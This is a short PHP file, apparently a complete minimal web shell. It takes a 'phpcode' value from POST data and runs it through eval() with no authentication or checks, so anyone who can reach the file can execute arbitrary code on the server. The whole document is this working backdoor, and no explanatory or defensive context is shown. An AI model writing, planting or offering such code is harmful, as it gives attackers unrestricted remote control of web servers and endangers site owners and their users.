<?php
$phpcode = $_POST['phpcode'];
if($phpcode){
	eval("?".">$phpcode<?php ");
}
?>